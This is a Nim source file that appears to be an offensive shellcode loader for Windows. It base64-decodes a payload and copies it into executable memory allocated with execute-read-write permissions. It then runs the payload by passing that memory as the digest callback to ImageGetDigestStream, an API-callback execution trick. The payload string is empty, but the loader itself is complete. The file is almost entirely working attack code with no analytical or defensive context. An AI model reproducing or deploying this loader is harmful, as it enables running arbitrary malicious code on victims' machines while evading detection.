import base64

import winim
import winim/lean

proc imageGetDigestStream[byte](shellcode: openArray[byte]): void =

  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))

  let img = CreateFileW(r"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))

  var dummy: DIGEST_HANDLE
  ImageGetDigestStream(img, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, cast[DIGEST_FUNCTION](rPtr), cast[DIGEST_HANDLE](NULL))

  CloseHandle(img)

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = ""

  let shellcode = toByteSeq(decode(enc))
  imageGetDigestStream(shellcode)
